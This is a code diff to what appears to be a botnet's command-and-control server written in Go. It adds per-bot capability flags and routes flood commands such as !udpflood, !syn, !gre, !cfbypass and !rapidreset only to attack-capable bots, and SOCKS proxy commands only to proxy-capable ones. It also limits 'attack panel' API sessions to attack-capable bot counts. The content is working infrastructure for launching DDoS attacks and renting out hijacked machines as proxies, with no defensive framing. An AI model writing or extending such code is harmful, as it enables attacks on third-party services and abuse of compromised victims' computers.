@@ -256,6 +256,11 @@ func trackSocksState(cmd string, botID string) {
 			botConnsLock.Unlock()
 			return
 		}
+		// Never mark a non-SOCKS bot as active — the stub silently ignores the command.
+		if !bc.socksEnabled {
+			botConnsLock.Unlock()
+			return
+		}
 		switch fields[0] {
 		case "!socks":
 			bc.socksActive = true
@@ -660,6 +665,12 @@ func handleAPIMe(w http.ResponseWriter, r *http.Request) {
 		running = make([]map[string]interface{}, 0)
 	}
 
+	// API key (attack panel) sessions see only attack-capable bots.
+	botCount := getBotCount()
+	if sess.IsAPIKey {
+		botCount = getAttackBotCount()
+	}
+
 	writeJSON(w, http.StatusOK, map[string]interface{}{
 		"username":        user.Username,
 		"level":           user.Level,
@@ -667,7 +678,7 @@ func handleAPIMe(w http.ResponseWriter, r *http.Request) {
 		"maxtime":         user.Maxtime,
 		"concurrents":     user.Concurrents,
 		"maxbots":         user.Maxbots,
-		"bot_count":       getBotCount(),
+		"bot_count":       botCount,
 		"running_attacks": running,
 		"is_api_key":      sess.IsAPIKey,
 	})
@@ -702,21 +713,23 @@ func handleDashboard(w http.ResponseWriter, r *http.Request) {
 // ============================================================================
 
 type apiBotEntry struct {
-	BotID       string `json:"botID"`
-	Arch        string `json:"arch"`
-	IP          string `json:"ip"`
-	RAM         int64  `json:"ram"`
-	CPUCores    int    `json:"cpuCores"`
-	ProcessName string `json:"processName"`
-	Country     string `json:"country"`
-	Group       string `json:"group"`
-	ConnectedAt string `json:"connectedAt"`
-	LastPing    string `json:"lastPing"`
-	Uptime      string `json:"uptime"`
-	UplinkMbps  float64 `json:"uplinkMbps"`
-	SocksActive bool    `json:"socksActive"`
-	SocksRelay  string  `json:"socksRelay"`
-	SocksUser   string  `json:"socksUser"`
+	BotID           string  `json:"botID"`
+	Arch            string  `json:"arch"`
+	IP              string  `json:"ip"`
+	RAM             int64   `json:"ram"`
+	CPUCores        int     `json:"cpuCores"`
+	ProcessName     string  `json:"processName"`
+	Country         string  `json:"country"`
+	Group           string  `json:"group"`
+	ConnectedAt     string  `json:"connectedAt"`
+	LastPing        string  `json:"lastPing"`
+	Uptime          string  `json:"uptime"`
+	UplinkMbps      float64 `json:"uplinkMbps"`
+	SocksActive     bool    `json:"socksActive"`
+	SocksRelay      string  `json:"socksRelay"`
+	SocksUser       string  `json:"socksUser"`
+	AttacksEnabled  bool    `json:"attacksEnabled"`
+	SocksEnabled    bool    `json:"socksEnabled"`
 }
 
 func handleAPIBots(w http.ResponseWriter, r *http.Request) {
@@ -728,21 +741,23 @@ func handleAPIBots(w http.ResponseWriter, r *http.Request) {
 			group := botGroups[bc.botID]
 			botGroupsLock.RUnlock()
 			bots = append(bots, apiBotEntry{
-				BotID:       bc.botID,
-				Arch:        bc.arch,
-				IP:          bc.ip,
-				RAM:         bc.ram,
-				CPUCores:    bc.cpuCores,
-				ProcessName: bc.processName,
-				Country:     bc.country,
-				Group:       group,
-				ConnectedAt: bc.connectedAt.Format(time.RFC3339),
-				LastPing:    bc.lastPing.Format(time.RFC3339),
-				Uptime:      formatDuration(time.Since(bc.connectedAt)),
-				UplinkMbps:  bc.uplinkMbps,
-				SocksActive: bc.socksActive,
-				SocksRelay:  bc.socksRelay,
-				SocksUser:   bc.socksUser,
+				BotID:           bc.botID,
+				Arch:            bc.arch,
+				IP:              bc.ip,
+				RAM:             bc.ram,
+				CPUCores:        bc.cpuCores,
+				ProcessName:     bc.processName,
+				Country:         bc.country,
+				Group:           group,
+				ConnectedAt:     bc.connectedAt.Format(time.RFC3339),
+				LastPing:        bc.lastPing.Format(time.RFC3339),
+				Uptime:          formatDuration(time.Since(bc.connectedAt)),
+				UplinkMbps:      bc.uplinkMbps,
+				SocksActive:     bc.socksActive,
+				SocksRelay:      bc.socksRelay,
+				SocksUser:       bc.socksUser,
+				AttacksEnabled:  bc.attacksEnabled,
+				SocksEnabled:    bc.socksEnabled,
 			})
 		}
 	}
@@ -1004,6 +1019,19 @@ func handleAPICommand(w http.ResponseWriter, r *http.Request) {
 	trackWebAttack(cmd, sess.Username)
 
 	if req.BotID != "" {
+		// Capability check for targeted commands.
+		bot := findBotByID(req.BotID)
+		if bot != nil {
+			if attackCmds[cmdLower] && !bot.attacksEnabled {
+				writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Bot not built with attack modules"})
+				return
+			}
+			socksCmds := map[string]bool{"!socks": true, "!stopsocks": true, "!socksauth": true}
+			if socksCmds[cmdLower] && !bot.socksEnabled {
+				writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Bot not built with SOCKS module"})
+				return
+			}
+		}
 		ok := sendToSingleBot(req.BotID, cmd)
 		if ok {
 			trackSocksState(cmd, req.BotID)
@@ -1013,7 +1041,15 @@ func handleAPICommand(w http.ResponseWriter, r *http.Request) {
 			writeJSON(w, http.StatusNotFound, map[string]interface{}{"success": false, "message": "Bot not found"})
 		}
 	} else {
-		sendToBots(cmd)
+		// Route attack/socks commands only to capable bots
+		switch cmdLower {
+		case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!syn", "!ack", "!gre", "!dns", "!cfbypass", "!rapidreset", "!stop":
+			sendToAttackBots(cmd)
+		case "!socks", "!stopsocks", "!socksauth":
+			sendToSocksBots(cmd)
+		default:
+			sendToBots(cmd)
+		}
 		trackSocksState(cmd, "")
 		count := getBotCount()
 		PushActivity("command", fmt.Sprintf("broadcast -> %d bots: %s", count, cmd))
@@ -1522,9 +1558,28 @@ func handleAPITasks(w http.ResponseWriter, r *http.Request) {
 		}
 
 		// Execute immediately
+		cmdLowerTask := strings.ToLower(strings.Fields(cmd)[0])
+		attackCmdsTask := map[string]bool{
+			"!udpflood": true, "!tcpflood": true, "!http": true, "!https": true,
+			"!tls": true, "!syn": true, "!ack": true, "!gre": true, "!dns": true,
+			"!cfbypass": true, "!rapidreset": true, "!stop": true,
+		}
+		socksCmdsTask := map[string]bool{"!socks": true, "!stopsocks": true, "!socksauth": true}
+
 		status := "sent"
 		result := ""
 		if req.BotID != "" {
+			bot := findBotByID(req.BotID)
+			if bot != nil {
+				if attackCmdsTask[cmdLowerTask] && !bot.attacksEnabled {
+					writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Bot not built with attack modules"})
+					return
+				}
+				if socksCmdsTask[cmdLowerTask] && !bot.socksEnabled {
+					writeJSON(w, http.StatusForbidden, map[string]interface{}{"success": false, "message": "Bot not built with SOCKS module"})
+					return
+				}
+			}
 			ok := sendToSingleBot(req.BotID, cmd)
 			if ok {
 				trackSocksState(cmd, req.BotID)
@@ -1534,7 +1589,14 @@ func handleAPITasks(w http.ResponseWriter, r *http.Request) {
 				result = "Bot not found"
 			}
 		} else {
-			sendToBots(cmd)
+			switch cmdLowerTask {
+			case "!udpflood", "!tcpflood", "!http", "!https", "!tls", "!syn", "!ack", "!gre", "!dns", "!cfbypass", "!rapidreset", "!stop":
+				sendToAttackBots(cmd)
+			case "!socks", "!stopsocks", "!socksauth":
+				sendToSocksBots(cmd)
+			default:
+				sendToBots(cmd)
+			}
 			trackSocksState(cmd, "")
 			count := getBotCount()
 			result = fmt.Sprintf("Sent to %d bots", count)
